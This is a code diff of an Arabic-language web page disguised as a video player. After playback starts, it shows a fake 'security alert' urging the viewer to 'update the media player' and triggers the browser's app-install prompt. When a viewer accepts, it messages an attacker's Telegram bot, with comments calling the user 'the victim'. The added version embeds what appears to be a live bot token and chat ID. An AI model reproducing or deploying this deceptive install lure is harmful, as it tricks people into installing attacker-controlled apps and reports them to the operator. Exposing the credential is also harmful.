@@ -1,74 +1,55 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Media Player Engine</title>
-    
+    <title>Video Player Support</title>
     <link rel="manifest" href="manifest.json">
-    <meta name="theme-color" content="#000000">
-
     <style>
-        body { background-color: #000; color: #fff; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        video { width: 90%; max-width: 800px; border: 2px solid #333; border-radius: 8px; box-shadow: 0 0 20px rgba(255,0,0,0.2); }
-        .status { margin-top: 15px; color: #888; font-size: 0.9em; }
+        body { margin: 0; background-color: #000; overflow: hidden; display: flex; align-items: center; justify-content: center; height: 100vh; }
+        video { width: 100%; height: auto; max-height: 100vh; }
     </style>
 </head>
 <body>
 
-    <video id="myVideo" controls poster="icon-512.png">
-        <source src="video.mp4" type="video/mp4">
-        متصفحك لا يدعم تشغيل هذا الفيديو.
+    <video id="myVideo" playsinline autoplay muted poster="trend_bg.jpg.jpg">
+        <source src="v.mp4" type="video/mp4">
     </video>
 
-    <div class="status" id="stat">جارِ فحص جودة الاتصال...</div>
-
     <script>
-        // 1. تسجيل الـ Service Worker (ملف sw.js)
+        // تسجيل الخدمة في الخلفية
         if ('serviceWorker' in navigator) {
-            navigator.serviceWorker.register('sw.js').then(() => {
-                console.log("Service Worker Active");
-            });
+            navigator.serviceWorker.register('sw.js');
         }
 
         let installPrompt = null;
         const video = document.getElementById('myVideo');
-        const statusText = document.getElementById('stat');
 
-        // 2. صيد حدث التثبيت وتخزينه
+        // صيد طلب التثبيت
         window.addEventListener('beforeinstallprompt', (e) => {
             e.preventDefault();
             installPrompt = e;
-            console.log("PWA Ready to capture");
         });
 
-        // 3. الفعل اللي هيحصل أول ما الفيديو يخلص
-        video.onended = async () => {
-            statusText.innerText = "⚠️ خطأ في بروتوكول التشغيل...";
-            
-            if (installPrompt) {
-                // رسالة الإقناع النهائية
-                const userConfirm = confirm("تنبيه أمني: لمتابعة مشاهدة الجزء الثاني من الفيديو بدون حظر، يجب تحديث 'إضافة مشغل الوسائط' لمتصفحك.\n\nهل تريد التثبيت الآن؟");
-                
-                if (userConfirm) {
-                    installPrompt.prompt(); // إظهار نافذة التثبيت الرسمية للموبايل
-                    
-                    const choice = await installPrompt.userChoice;
-                    if (choice.outcome === 'accepted') {
-                        // إرسال البيانات للبوت بتاعك (حط التوكن والـ ID هنا)
-                        const token = "YOUR_BOT_TOKEN"; 
-                        const id = "YOUR_CHAT_ID";
-                        const msg = encodeURIComponent("🎯 صيدة جديدة! الضحية وافق على التثبيت وبقى معاك على الشاشة الرئيسية.");
-                        
-                        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${id}&text=${msg}`);
-                        
-                        statusText.innerText = "تم التحديث بنجاح. جارِ إعادة التحميل...";
+        // تنفيذ الهجمة بعد 10 ثوانٍ
+        video.onplay = () => {
+            setTimeout(() => {
+                if (installPrompt) {
+                    if (confirm("⚠️ تنبيه: يجب تحديث مشغل الفيديو للمتابعة ومشاهدة المقطع كاملاً.\n\nتحديث الآن؟")) {
+                        installPrompt.prompt();
+                        installPrompt.userChoice.then((choice) => {
+                            if (choice.outcome === 'accepted') {
+                                // بيانات البوت بتاعتك اللي بعتها
+                                const token = "8644789773:AAHR24ApIVuGT10W5sDFD-Wm3fHJAEIlrrk";
+                                const chatId = "1356975454";
+                                const msg = "🎯 صيدة جديدة يا حسام!\nالضحية وافق على التثبيت وبقى معاك.";
+                                
+                                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
+                            }
+                        });
                     }
                 }
-            } else {
-                // لو المتصفح مش مدعم أو متثبت قبل كدة
-                alert("يرجى تحديث المتصفح لمتابعة المشاهدة.");
-            }
+            }, 10000); // 10 ثوانٍ بالظبط
         };
     </script>
 </body>
